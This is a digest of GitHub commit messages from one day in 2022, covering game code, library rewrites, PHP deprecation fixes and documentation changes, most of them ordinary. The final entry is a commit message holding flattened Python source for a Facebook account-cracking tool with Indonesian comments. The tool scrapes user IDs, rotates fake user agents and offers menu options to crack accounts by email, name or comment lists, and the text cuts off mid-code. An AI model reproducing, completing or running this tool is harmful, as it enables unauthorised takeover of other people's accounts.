We could inline both checkscan and check_bot
check_bot SHOULD NOT BE CALLED ON EVERY OBJECT IN VIEW HOLY SHIT WHY
We don't need to process adjacent and the shuffled view separately, it's
in fact easier to process them in one block
Renames a var

Moves bot's pathing images to above most floor objects, so they're
visible in maint

## Why It's Good For The Game

Speed. Also manuel will stop killing their server by placing 20000
medibots (fucking icebox man every time)

## Changelog


:cl:
fix: Bots will now "notice" you if you're standing right next to them
fix: Bot paths will now draw above things like pipes, rather then below
them
refactor: Changed how pathfinding paths get generated
refactor: Made pathfinding and bot searching significantly faster
/:cl:


Co-authored-by: Mothblocks <35135081+Mothblocks@users.noreply.github.com>

---
## [Kapu1178/tgstation](https://github.com/Kapu1178/tgstation)@[32c2e4ccd3...](https://github.com/Kapu1178/tgstation/commit/32c2e4ccd3ee10b62a8f5d8e7ad3dbd1e33213ea)
#### Tuesday 2022-11-22 08:25:40 by Fikou

gives medical ert a health analyzer (#70244)

* gives medical ert a health analyzer

* fuck you *upgrades your analyzer*

---
## [Offroaders123/NBTify](https://github.com/Offroaders123/NBTify)@[f00ef02b0f...](https://github.com/Offroaders123/NBTify/commit/f00ef02b0f9fa9e7e95f05042b301afd14b9101f)
#### Tuesday 2022-11-22 08:36:18 by Offroaders123

NBTData Rewrite + Option Types + Coding Bonanza

Rewrote the `NBTData` object to be way more secure like the rest of the library! Now it specifically allows only certain data in, and it will be frozen immediately after it is constructed. I want it to work like a native platform class would, so I have been following how `ImageData` works, and what it's data flow is, and how secure it is.

When `ImageData` is constructed, all of the resulting properties on the constructed object are all readonly, and you can't add any more properties to the object either. Thanks yet again to StackOverflow, turns out this is a great use case for `Object.freeze()`! It's also a bonus that I *don't* want the `NBTData.data` property to readonly, that one should be editable. `Object.freeze()` only freezes the object your pass into it, so it won't recursively freeze objects that are inside of that one. Sometimes that would be what your are looking for, but I don't really need that for this case.

https://stackoverflow.com/questions/67698353/is-there-an-elegant-way-to-set-a-class-property-only-once

Along with the readonly-nature of `NBTData`, it now also has error handling! So if you pass in broken parameters into the constructor, it will get you back for it! *No more rotten data for me, no thank you! - NBTData*.

For the option types, they now have their own separate dedicated type definitions! No longer is there a general `Metadata` interface which has those types on it. Now you can way more easily pick and choose which ones you need, and add those to a new interface you're making.

Oh yeah! I also got recursive `new NBTData()` constructors working too! So, since `NBTData` objects will now be readonly, there wouldn't be a way to easily make a new object with that same data. Before you could just modify the property on the object yourself, then do what you will, but now that's not available anymore. Instead, you call it like this: `new NBTData(new NBTData({ thing: "noice" },{ endian: "big" }),{ endian: "little", compression: "gzip" })`. You probably wouldn't need to do it directly like that, it's more for transforming an existing set of NBT data that you loaded in, and you may want to convert it to a different format type, say to change the endian type. I for example will eventually use this to convert a set of NBT data from one Minecraft version to another.

Reworded some of the error text in a few spots, mostly generalizing them to be less wordy, and changing `"argument"` to `"parameter"` (Noticed I was doing that somewhere else, and I think I like that better :D ).

The constructed `NBTData` object isn't actually quite set to readonly yet, as there's a little bit of a messy spot in the `read()` function that requires it to be editable, so I left that for after this update. I wanted to safely push these changes while they definitely work, before I screw things up XD

Eyooo, I don't know how I've been coding so much this week, it's been really refreshing! Changing between a lot of my different projects, and taking breaks when I work on it for too long has been helping out a *TON*. I've been wanting to get essentially these set of changes to the `NBTData` object going for a while now, but sometimes it just hasn't clicked yet. I think it's when you don't quite know how you want it to work yet, and that kind of holds you back. Somehow, going to a different project and working on that instead really helps you for when you come back to the original project. You learn one thing over in the second project, and then it unexpectedly helps with another mountain in the first project! It just clicks sometimes, for some reason. This many commits this month is crazy, I think it said 55 so far, if I remember right. I don't know if I've had that many in a month before! I'm fine if that means I need to take a break after this crazy brainstorm. It's been a nice ride of tackling thing after thing, and I just keep wanting to see what other little things I can conquer for each project. Writing things like this has been very nice for me too, I essentially do this over on Strava too much too haha, pretty much just as long as this one is here. I think I definitely will look into making a journal entry loader kind of thing, which would dynamically turn my Git commit messages into a journal with dates, of some sort. It would be like an auto-blog, driven by my Git history XD. It would have dates and all those kinds of things too, so it would look like a news site, but it would be with articles like these, or whatever this whole messages is. Essentially, a code-driven life update! Aaah, this is so cool. O-PEN-SOURCE! O-PEN-SOURCE! O-PEN-SOURCE!

Listened to Rush Counterparts on the way home from work last night, it's mixed so well! Same with the new(ish) Dream Theater (AVFTTOTW). You can turn them up loud, and the speakers don't start to die on you even with it being loud.

I have noticed an interesting correlation between how what I think the creative part of my brain performs. During this coding bonanza the last few weeks, I feel like I haven't mentally had musical energy to write any songs, which is interesting. I think music and coding probably have a similar room in my mind (that should be a song!!! *Similar Room in my Mind*), so sometimes one takes up more space than the other. After this coding wave goes down, I semi-predict that my music drive will be back strong like the coding drive has been. It's not that I haven't wanted to work on music, but I recorded a few songs, and I felt like it was the same-old same-old, and that kind of turned me away. I know well by now that not all songs are great (I love that!), so it's not that the song was that bad. It's like I didn't want to try and fix it to where it should have gone to. Just like the coding projects, I think leaving it to dry out for a little bit helps freshen it up, more so than trying to bang it with a hammer until it doesn't even fit in the round hole XD

Ok, I think that was everything I was gonna cover? Ya never know haha. Gn!

---
## [Yoast/wordpress-seo](https://github.com/Yoast/wordpress-seo)@[27b82c6f3f...](https://github.com/Yoast/wordpress-seo/commit/27b82c6f3fdd2a61db09a3a25ef21decfcd61431)
#### Tuesday 2022-11-22 09:43:06 by jrfnl

Surfaces\Values\Meta: fix dynamic property setting in magic methods

The magic `Surfaces\Values\Meta::__get()` method was creating dynamic properties on the class, where dynamic properties are properties not declared on the class which subsequently created on the fly as `public` properties.

As of PHP 8.2, creating dynamic properties is deprecated.

This commit fixes this by:
* Declaring a `private` `$properties_bin` array property to the class.
* Adjusting the magic `__get()` method to save the values for the properties in the `$properties_bin` instead of dynamically creating properties.
* Adjusting the magic `__get()` method to take values previously saved to the `$properties_bin` into account.
* Adjusting the magic `__isset()` method to also look in the `$properties_bin` when determining whether a property is set or not.
* Forbidding setting and unsetting properties other than the declared ones and those supported via the magic `__get()` method by adding new magic `__set()` and `__unset()` methods which will throw an exception.

Note: this does mean to access these properties once set, the magic `__get()` method will now always be called, where previously it would be bypassed. This may have a very very tiny impact on performance.

Also note that there are a few caveats/changes in behaviour:
* Setting dynamic properties on the class is now forbidden, not just for the above case, but in all cases. Previously dynamic properties could still be assigned to the class.
* The class is not `final` and potential child classes and (inaccessible) properties of those are not taken into account in the magic `__get()` method.
    We did do some extensive searches to check if the class _is_ being extended and those searches didn't yield any usable results.

What hasn't changed: access to the already declared `protected` properties from outside the class was previously not supported via the magic methods and is still not supported.

Includes tests for the new `__set()` and `__unset()` methods and a safeguard that the magic `__get()` method does not return the values for `protected` or `private` properties.

---
Internal: if anyone is wondering why this implementation was chosen:
- Hard declaring the properties would be maintenance unfriendly and error-prone as each of the properties would need to be `unset()` in the class constructor as otherwise the magic methods would not be triggered to lazily set the value for the property.
    It would also mean that "sets" and "unsets" cannot be blocked as once the property is declared/initialized, the magic methods are bypassed.
    I.e. the constructor would need to be updated every time a property would be added/removed, but only for the properties supported by magic, which means that the cognitive load when updating the class would also increase.
- Now, you may wonder "why not declare these properties anyway, but make them `private` and not bother with the `unset()` ?" Good question, but access to `private` properties from within the class does not go via the magic methods _unless_ the property is _unset_.
- We also discussed having initial `null` values for all supported properties in the `$properties_bin`, which would then effectively function as an "allow list" for the properties supported by the magic methods.
    We decided against that as a) that would give a special meaning to a `null` value, which means that if the "lazy initialization" would result in a `null` value, the lazy initialization could no longer be short-circuited and b) this would again cause maintenance overhead making it error prone.
---

Tests for the real functionality of the preexisting `__get()` and `__isset()` methods should be added by the team at a later date.

---
## [Murmeldyret/P3-Project](https://github.com/Murmeldyret/P3-Project)@[28568f6733...](https://github.com/Murmeldyret/P3-Project/commit/28568f67336bbf80d9635fa3ab0575742b180915)
#### Tuesday 2022-11-22 10:46:15 by Erik

HALLELUJAH!

My prayers have been heard! 
- Regex for poor references, website references, and correct apa ref are complete.
 - Antologies will not function in these, as I cannot fathom a pattern between correct and ucn students ways.
- Lots of ways to refactor should the urge arise :D
- Always check for the search string "[Internet]" before anything else in order to separate references between credible and well... website references.
- referencetests are poor as I only test one instance of references and a theory should be used instead, but maaan, VS got mad at me when i tried that.
- Anyways. Shit works to some extend. remember to apply Fastenshtein to correct for any marginal errors in the texts.

- Happy Hanukkah people <3

---
## [danieljharvey/mimsa](https://github.com/danieljharvey/mimsa)@[2cdf13d80c...](https://github.com/danieljharvey/mimsa/commit/2cdf13d80c070f8e0677e0736954b7a0279a8484)
#### Tuesday 2022-11-22 11:07:05 by Daniel Harvey

Add tuples (#826)

* Oh my god this is boring

* Fix GHC options

* Bin off

* Format

* Now fix all the type errors in the tests and cry

* WIP fix tests

* Well, shit, these pass

* WIP

* Well, well, well

* Yeah

---
## [samuelsvalenz/bellabeat](https://github.com/samuelsvalenz/bellabeat)@[29feb6e1df...](https://github.com/samuelsvalenz/bellabeat/commit/29feb6e1df5beb32949e5ba21fd9829ddb4d2992)
#### Tuesday 2022-11-22 11:25:19 by Sam Valenzuela

Create bellabeat_analysis.sql

We only received sleep data for 413 customer days. However, we received activity data for 940 customer days. There are a couple ways to interpret this. It is possible that the sleep data is incomplete. It’s also possible that the customers were not wearing their devices to sleep. I can think of a couple of reasons they might not do this. One is that they charge their device overnight. The other is that the device is uncomfortable to wear to sleep. I think if the business could both extended battery life and make the devices more comfortable, specifically for sleeping, they could take advantage of that gap.

---
## [IPD-Dev/FastAsynchronousIncompetence](https://github.com/IPD-Dev/FastAsynchronousIncompetence)@[2fe54a04b5...](https://github.com/IPD-Dev/FastAsynchronousIncompetence/commit/2fe54a04b5d2b8cbb2a26947df610f3c8d4400ca)
#### Tuesday 2022-11-22 11:29:44 by Pierre Maurice Schwang

Adjust platform specific code to recent changes (#1997)

* chore: remove usage of MCUtil in StarlightRelighter

* chore: cleanup of unused imports

* hacky shit-fuckery for papers new chunksystem und refactor

* chore: address review comments

* Update dependency io.papermc.paperweight.userdev:io.papermc.paperweight.userdev.gradle.plugin to v1.3.9 (#2001)

Co-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>

* fix: suppress exceptions for field retrieval, cache fields / methods

Co-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>

---
## [ThePiachu/cmss13](https://github.com/ThePiachu/cmss13)@[7cb69c2a8b...](https://github.com/ThePiachu/cmss13/commit/7cb69c2a8b6f8895d5475b709183a3f30d05fbeb)
#### Tuesday 2022-11-22 11:35:10 by Joelampost

Creates a new tile for the predator ship (#1400)

* erm

* yer

* fuck you shaddeh

---
## [EoaNB-Team/EoaNB](https://github.com/EoaNB-Team/EoaNB)@[c169937bf8...](https://github.com/EoaNB-Team/EoaNB/commit/c169937bf89bbbec47ec44cee15a868939e5567c)
#### Tuesday 2022-11-22 11:49:28 by Kenhel

Kuba's russian national spirit

national spirit icons, also im gonna clean up the ideas.gfx file being split into the 4 separate zone which is a left over relic of garions fucked up gfx rework, maybe ill do it later after im done eating because right now splitting the .gfx files up into separate zones helps no one, it clutters up the gfx folder, the "_" at the front means that I can't just hit "i" and fine the ideas icon. Also the fact that there are some left over shit in the main ideas.gfx file just makes it worse.

---
## [tjgq/bazel](https://github.com/tjgq/bazel)@[2232c5b445...](https://github.com/tjgq/bazel/commit/2232c5b445f5264b31b53a698f5f0e726d9be249)
#### Tuesday 2022-11-22 12:43:08 by Christopher Peterson Sauer

Move Boost into C++ Docs; Add Libraries Section

Hi wonderful Bazelers,

This is just a docs change.

Backstory: I'd been looking to make HTTPS requests across platforms from C++. A classic problem if there ever were one, networking being perhaps the most glaring omission in the C++ standard library. Thankfully, this is a problem Bazel can solve well, since most of the problem is the friction of using 3rd party libraries from C++. So, I spun up some build rules to make network requests easy, inspired by collaborating on the boost ones, and set off to add them to the docs.

Along the way, I noticed that the boost rules were in an odd spot: Listed at the language level alongside C++, rather than nested within C++. So I fixed that by nesting Boost inside, added Abseil, and then (hoping you'll forgive my hubris), I'd love to add the rules I just released, since I think they're a solution to a very real need. Perhaps rules for more famous, critical libraries can accumulate there over time, helping Bazel users get set up with the essential tools they need.

Thanks for your consideration!
Chris
(ex-Googler and author of [bazel-compile-commands-extractor](https://github.com/hedronvision/bazel-compile-commands-extractor), also in the docs.)

Closes #16621.

PiperOrigin-RevId: 486106928
Change-Id: I119ccff4f70e66415f8c6ac4930c975e48086bc2

---
## [mnnkkk/Grasscutter](https://github.com/mnnkkk/Grasscutter)@[88bc5c4c54...](https://github.com/mnnkkk/Grasscutter/commit/88bc5c4c54c1aadcdc6cc9a24c0f69d4bebce97c)
#### Tuesday 2022-11-22 13:11:36 by Kimi

another translation patches because i fucked it up

i hate myself

---
## [Thunder12345/tgstation](https://github.com/Thunder12345/tgstation)@[3c187487b1...](https://github.com/Thunder12345/tgstation/commit/3c187487b1884040608ba23b0a89aa8b0176c2aa)
#### Tuesday 2022-11-22 13:45:01 by MrMelbert

Renews a bunch of old roundend new reports that got lost. Plus, some roundend report QoL for cult and revs. (#71284)

## About The Pull Request

A few roundend reports got lost from moving to dynamic and other prs.
This PRs re-allows them to occur. Namely: "Wizard Killed" (lost in
dynamic), "Blob nuked" (lost in dynamic), "Cult escaped" (lost in cult
rework), and "Nuke Ops Victory" (station destroyed via nuke) (lost from,
what I can see, an oversight / accidental swap of report values).

Additionally, small roundend report QOL for cult: Removes antag datums
from spirit realm ghosts after being dusted, so they do not show up on
the report. And in reverse, heads of staff who were dusted / destroyed
in revolution rounds are now also shown in roundend reports.

## Why It's Good For The Game

Some of these reports are dead, which is is a shame because I think
they're cool and fun.

## Changelog

:cl: Melbert
qol: Successfully fending off a blob now has a cross station news report
again. More pressing reports will take priority over it, though.
qol: Successfully killing a wizard (and all of their apprentices) now
has a cross station news report again.
qol: If more than half of a cultist team manages to escape on the
shuttle (rather than summoning Nar'sie), they will send a unique cross
station news report. This is still a loss, by the way. Summon Nar'sie!
qol: Nuclear Operatives successfully nuking the station now has its
unique cross station news report again, and no longer uses the generic
"The station was nuked" report.
qol: Nuking the station to stop a blob infection now has a unique cross
station news report again. Good luck convincing admins to allow this.
qol: Cult ghosts from "Spirit Realm" no longer persist on the cult's
team after being desummoned, meaning they will not show up on roundend
report.
qol: Heads of staff will now always show up on revolution roundend
report - even if their body was fully destroyed.
/:cl:

---
## [Damego/library](https://github.com/Damego/library)@[e527a7d034...](https://github.com/Damego/library/commit/e527a7d034f93781d2739a380a1c87c089fdf572)
#### Tuesday 2022-11-22 13:53:33 by EdVraz

feat(channel): Add new overwrite helper methods (#1173)

* fix: edge case

* refactor: move import

* guys I don't recommend coding when you're sick

* do stuff

* omg what the fuck did i code yesterday

* fix: simplify code

* feat: add another helper method

* Update channel.py

---
## [ThePainkiller/sojourn-station](https://github.com/ThePainkiller/sojourn-station)@[f466536b6f...](https://github.com/ThePainkiller/sojourn-station/commit/f466536b6f29dbff2b742df1a5e666eb4880c14f)
#### Tuesday 2022-11-22 14:44:36 by ThePainkiller

Shields, sounds, holsters and more

- Better sound for blocking with shields, also sounds for stopping projectiles with them (and breaking)
- Ports the double belt pistol holder (pouch) and throwing knives rig (pouch) from Eris. With belt-worn sprites made by me.
- Adds the belt pistol holster and knife rig to the marshal vendors and absolutist printing disk
- Ports the Bulldozer shield from Eris, tweaks its recipe to include an actual closet
- Makes suit sensors spike in danger if someone's toxloss is at 70 or higher, since that is the point of liver failure
- On the same note, reduces the amount of organ damage from MSOF as it was too punishing, allowing for a better window of opportunity to save someone from dying
- Makes deployable barriers needed to be anchored to be able to brace your gun on it
- Adds most types of holsters to marshals vendors, ups their quantity
- Soteria Gauze and Ointment buffed on par with Church ones, to justify their convoluted hand-crafting method
- Makeshift AK and Luty added to random handmade guns to spawn
- Rangers get the double holster instead of the single one
- Adds a generic katana to loadout for four points
- Adds better sounds for the following emotes: male and female *sigh, *whistle (more variety), female *urah
- Adds snort and awhistle (targeted) emotes
- Makes a lot of audible emotes actually check if you're muzzled instead of magically being executed despite mouth coverage
- Adds some of the missing emotes to the *help list
- Adds hissing, meowing, and purring sound for cats, they will hiss at any ghosts they detect now!
- Fixes Mana from Heaven invisible sprite
- Claw and Baton energy drinks added overdose that causes organ damage at 60 units consumed
- Fixes incorrect Claw RED and BLUE sprites
- Claw Blue made actually made tastier
- Case Closer baton now contains atomic coffee instead of espresso (Marshal buff)
- Hay Fever claw energy improved citric formula
- Attempts to port Shields blocking projectiles functionality from Eris, but fails miserably (Tested not to work, but leaving the groundwork just in case)

---
## [aaakintoye/printf](https://github.com/aaakintoye/printf)@[3fb35d2bdd...](https://github.com/aaakintoye/printf/commit/3fb35d2bddf5d4259e725f51c7026f376f0c9feb)
#### Tuesday 2022-11-22 14:50:41 by CHUKWUDI BLESSING

printf project README file  This is our first team work. The task printf is written C programming language. 


0. I'm not going anywhere. You can print that wherever you want to. I'm here and I'm a Spur for life
1. Education is when you read the fine print. Experience is what you get if you don't
2. With a face like mine, I do better in print
3. What one has not experienced, one will never understand in print
4. Nothing in fine print is ever good news
5. My weakness is wearing too much leopard print
6. How is the world ruled and led to war? Diplomats lie to journalists and believe these lies when they see them in print
7. The big print gives and the small print takes away
8. Sarcasm is lost in print
9. Print some money and give it to us for the rain forests
10. The negative is the equivalent of the composer's score, and the print the performance
11. It's depressing when you're still around and your albums are out of print
12. Every time that I wanted to give up, if I saw an interesting textile, print what ever, suddenly I would see a collection
13. Print is the sharpest and the strongest weapon of our party
14. The flood of print has turned reading into a process of gulping rather than savoring
15. *

---
## [Henauxg/bevy](https://github.com/Henauxg/bevy)@[4847f7e3ad...](https://github.com/Henauxg/bevy/commit/4847f7e3adc835053a8907dd578c342b4bd395e2)
#### Tuesday 2022-11-22 15:18:06 by ira

Update codebase to use `IntoIterator` where possible. (#5269)

Remove unnecessary calls to `iter()`/`iter_mut()`.
Mainly updates the use of queries in our code, docs, and examples.

```rust
// From
for _ in list.iter() {
for _ in list.iter_mut() {

// To
for _ in &list {
for _ in &mut list {
```

We already enable the pedantic lint [clippy::explicit_iter_loop](https://rust-lang.github.io/rust-clippy/stable/) inside of Bevy. However, this only warns for a few known types from the standard library.

## Note for reviewers
As you can see the additions and deletions are exactly equal.
Maybe give it a quick skim to check I didn't sneak in a crypto miner, but you don't have to torture yourself by reading every line.
I already experienced enough pain making this PR :) 


Co-authored-by: devil-ira <justthecooldude@gmail.com>

---
## [hasanraj720/FUCKER-V1](https://github.com/hasanraj720/FUCKER-V1)@[766166f13e...](https://github.com/hasanraj720/FUCKER-V1/commit/766166f13e29a8830f7d5671748c23f674ad6dc8)
#### Tuesday 2022-11-22 15:37:59 by FUCKER

#!/usr/bin/python3 # -*- coding: utf-8 -*- """ Developer By HASAN MAHMUD SALMAN FARSI """ import bs4 # <========== IMPORT RANDOM PYTHON import re import time import requests import datetime import os import sys import random import platform import json import subprocess import stdiomask from concurrent.futures import ThreadPoolExecutor as tred from bs4 import BeautifulSoup as parser from datetime import datetime from time import sleep import requests as req from urllib.parse import unquote hp = platform.platform() ses = requests.Session() from colorama import Fore Q = Fore.BLUE # <========== WARNA BIRU J = Fore.LIGHTBLUE_EX # <========== WARNA BIRU P = Fore.WHITE # <========== WARNA PUTIH W = Fore.CYAN # <========== WARNA BIRUMUDA I = Fore.GREEN # <========== WARNA IJO H = Fore.GREEN # <========== WARNA IJO N = Fore.GREEN # <========== WARNA IJO U = Fore.YELLOW # <========== WARNA KUNING M = Fore.RED # <========== WARNA MERAH O = Fore.MAGENTA # <========== WARNA PINK B = Fore.CYAN # <========== WARNA BIRU q = Fore.BLUE # <========== WARNA BIRU j = Fore.LIGHTBLUE_EX # <========== WARNA BIRU p = Fore.WHITE # <========== WARNA PUTIH w = Fore.CYAN # <========== WARNA BIRUMUDA i = Fore.GREEN # <========== WARNA IJO h = Fore.GREEN # <========== WARNA IJO n = Fore.GREEN # <========== WARNA IJO u = Fore.YELLOW # <========== WARNA KUNING m = Fore.RED # <========== WARNA MERAH o = Fore.MAGENTA # <========== WARNA PINK b = Fore.CYAN # <========== WARNA BIRU K = random.choice([U,J,O,B]) # <========== RANDOM WARNA def banner(): # <========== BANNER 	os.system("clear") 	wardom = random.choice([J,U,W,I]) 	wr(f""" ╔╗╔╗╔══╗╔══╗╔══╗╔═╦╗ ║╚╝║║╔╗║║══╣║╔╗║║║║║ ║╔╗║║╠╣║╠══║║╠╣║║║║║ ╚╝╚╝╚╝╚╝╚══╝╚╝╚╝╚╩═╝ ──────────────────── sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"] # <========== TANGGAL out = 'Linux-4.9.227-perf+-aarch64-with-libc' tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"} now = datetime.now() hari = now.day blx = now.month try: 	if blx < 0 or blx > 12:exit() 	xx = blx - 1 except ValueError:exit() bulan = sasi[xx] tahun = now.year tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun) nano_nini = f'OK-{hari}-{bulan}-{tahun}.txt' nano_nana = f'CP-{hari}-{bulan}-{tahun}.txt' ua_silent = [] # <========== BUT LEN / STR dump = [] sandi= [] cepeh = [] metode = [] tetel = [] opsi = [] proxy = [] id = [] id2 = [] loop = 0 ok = 0 cp= 0 for x in range(999): # <========== GENERATOR BD 	rc = random.choice 	rr = random.randint 	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] 	A = f'Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF' 	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}' 	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko)' 	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/' 	E = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1' 	F = f'{A}{C}{D}{E}' 	rc = random.choice 	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z" 	F = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SAMSUNG SM-G{str(rr(111111,999999))}  Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko)  SamsungBrowser/{str(rr(1111,9999))}.{str(rr(111,999))} Chrome/{str(rr(1111111,9999999))} QQ/8.8.95.{str(rr(1111,9999))} Mobile Safari/537.36" 	if F in ua_silent:pass 	else:ua_silent.append(F) def jalan(______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____): #<========= BUAT TEKS BERJALAN 	for ______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ANJINKKKK____ in ______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ + "\n": 		sys.stdout.write(______KONTOL_____NANO____GANTENG____BABI___LU____TAI____KOMTOL____ANJINKKKK____) 		sys.stdout.flush() 		time.sleep(0.05) def wr(____MEMEK___KONTOL_ANJINK____BABI___ASUUU____MEMEK______LU___KEK______KONTOLLL_YA_____ANJINKKKK__): #<========= KATA TEKS BERJALAN KE BAWAH 	for ________NGENTOD______ENAK____GAK____SI_____YA____ANJINK____BABI____KONTOL___KAU____HARAM___  in ____MEMEK___KONTOL_ANJINK____BABI___ASUUU____MEMEK______LU___KEK______KONTOLLL_YA_____ANJINKKKK__ + '\n':  		sys.stdout.write(________NGENTOD______ENAK____GAK____SI_____YA____ANJINK____BABI____KONTOL___KAU____HARAM___) 		sys.stdout.flush() 		time.sleep(1.0/1000) def waktu():     import time     a=time.localtime()     hr=a.tm_hour     mn=a.tm_min     sc=a.tm_sec     return ('{}:{}:{}'.format(hr,mn,sc)) def salam(): #<========= BUT HASAN MAHMUD SALMAN FARSI 	now = datetime.now() 	hours = now.hour 	if 4 <= hours < 12:timenow = "Good Morning" #<========= UCAPAN SELAMAT PAGI 	elif 12 <= hours < 15:timenow = "Good Afternoon" #<========= UCAPAN SELAMAT SIANG 	elif 15 <= hours < 18:timenow = "Good Evening" #<========= UCAPAN SELAMAT SORE 	else:timenow = "Good Night" #<========= UCAPAN SELAMAT MALAM def menu(): # <========== MENU TOOLS 	banner() 	___nano___IP___ = requests.get("http://ip-api.com/json/").json()["query"] #<========= TAMPIL IP 	___nano___negara___ = requests.get("http://ip-api.com/json/").json()["country"] #<========= TAMPIL NEGARA 	___nano___re___ = requests.get("http://ip-api.com/json/").json()["regionName"] #<========= TAMPIL REGION 	___nano___ci___ = requests.get("http://ip-api.com/json/").json()["city"] #<========= TAMPIL CITY 	___nano___si___ = requests.get("http://ip-api.com/json/").json()["isp"] #<========= TAMPIL ISP 	___nano___org___ = requests.get("http://ip-api.com/json/").json()["org"] #<========= TAMPIL ORG 	___nano___ist___ = requests.get("http://ip-api.com/json/").json()["as"] #<========= TAMPIL AS 	wr(f""" {P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |____{P}Alamat ippaddres            : {W}{___nano___IP___} {W} |     |____{P}User From In          : {W}{___nano___negara___} {W} |     |____{P}User Name Region      : {K}{___nano___re___} {W} |     |____{P}User City In          : {K}{___nano___ci___} {W} |     |____{P}Sim Online            : {I}{___nano___si___} {W} |     |____{P}Org Online            : {I}{___nano___org___} {W} |     |____{P}Informations          : {I}{___nano___ist___} {W} | {W} |__________{P}Developer Tools       : {I} HASAN FARSI {W}       |    |___{P}WhatsApp          : {K} No What's App {W}       |    |___{P}Facebook          : {K}https://www.facebook.com/profile.php?id=100087448115280 {W}       | {W}       |_________{P}YouTube           : {K}https://youtube.com/channel/UCA-HpJUPfr6F433hRafcY_A {W}            |____{P}Github           : {K}https://github.com/hasanraj720  {P}[{W}01{P}] Crack dari pencarian email {P}[{W}02{P}] Crack dari pencarian email v2 {P}[{W}03{P}] Crack dari pencarian nama {P}[{W}04{P}] Crack dari postingan komentar {P}[{W}05{P}] Crack dari file {P}[{W}06{P}] Bot pencarian nama {P}[{W}07{P}] Bot auto download vidio {P}[{W}08{P}] Check pendapatan crack {P}[{W}09{P}] Check opsi akun\n""") 	jeeck = input(f"{P}[{K}•{P}] Masukan pilihan : {W}") 	if jeeck in ["01","1"]: 		email() # <========== CRACK EMAIL 	elif jeeck in ["02","2"]: 		emaill() # <========== CRACK EMAIL V2 	elif jeeck in ["03","3"]: 		nama() # <========== PENCARIAN NAMA 	elif jeeck in ["04","4"]: 		komen() # <========== UMP KOMUN 	elif jeeck in ["05","5"]: 		file() # <========== CRACK FILE 	elif jeeck in ["06","6"]: # <========== BOT PENCARIAN NO LOGIN 		nama = input(f"\n{P}[{K}•{P}] Masukan nama : {W}") 		username=search("https://mbasic.facebook.com/public/"+nama) 		for user in username: 			user=user.split("|") 			wr(f"""{P}[{W}•{P}]{W}----{P}[ {I}{waktu()} {P}] [ {I}{tanggal} {P}] {W} | {W} |_____{P}Userid         : {I}{user[0]} {W}     |_____{P}Username   : {I}{user[1]}""") 	elif jeeck in ["07","7"]: # <========== BOT DONLOD VIDEO 		url = input(f"\n{P}[{K}•{P}] Masukan url : {W}") 		url = url.replace("www","mbasic") 		nama = input(f"{P}[{K}•{P}] Nama hasil : {W}") 		result = down(url) 		result = req.get(result) 		size = round(int(result.headers.get("Content-Length"))/1024) 		jalan(f"\n{P}[{K}•{P}] Size hasil download {I}{size}") 		with open(f"/sdcard/Download/{nama}.mp4", "wb") as x: 			for data in result.iter_content(chunk_size=1024): 				x.write(data) 		jalan(f"\n{P}[{K}•{P}] Hasil download tersimpan di /sdcard/Download");exit() 	elif jeeck in ["08","8"]: 		hasi() # <========== FUCKER CRACK 	elif jeeck in ["09","9"]: 		cek_opsi_cp() # <========== MH SI HK 	else: 		jalan(f"\n{P}[{K}•{P}] {M}Masukanlah pilihan anda dengan benar ya anjink");menu() def down(url): # <========== BOT 	result=req.get(url).text 	if "video_redirect" in result: 		url=re.search(r'href\=\"\/video\_redirect\/\?src\=(.*?)\"',result) 		url=url.group(1).replace(";","&") 		return unquote(url) 	else: 		jalan(f"\n{P}[{K}•{P}] {M}Vido tidak terdownload");exit() def search(url): # <========== BOT 	global id 	req=requests.get(url).text 	usr=re.findall(r'<td class="bz ca"><a href="(.*?)"><div class="cb"><div class="cc">(.*?)</div></div>',req) 	for user in usr: 		username=user[0].replace("/","") 		if 'profile' in username: 			id.append(username.replace("profile.php?id=","")+"|"+user[1]) 		else: 			id.append(username+"|"+user[1]) 	if "Lihat Hasil Selanjutnya" in req: 		url=re.findall(r'<div class="l m" id="see_more_pager"><a href="(.*?)">',req)[0] 		search(url) 	return id def email(): #<========= UMP EMAIL V1 	rc = random.choice 	rr = random.randint 	bas = ["123","232","453","332","jr","225","3488","993","552","332","786","987","098","ganz","716","25","ff","123","456","983","113","331","441","333","666","777","898","987","7676","678","343","543","234","567","789"] 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','ganz','gtg','gege'] 	global ok , cp 	nama = input(f"\n{P}[{K}•{P}] Masukan nama target : {W}") 	if "," in str(nama): 		exit(f"\n{P}[{K}•{P}] {M}Masukan nama max 1 nama saja ") 	doma = "@gmail.com" 	if "@" not in str(doma) or ".com" not in str(doma) : 		exit(f"\n{P}[{K}•{P}] {M}Eorr ya anjink babi") 	jumlah = input(f"{P}[{K}•{P}] Masukan max : {W}") 	for xyz in range(int(jumlah)): 		A = nama 		B = 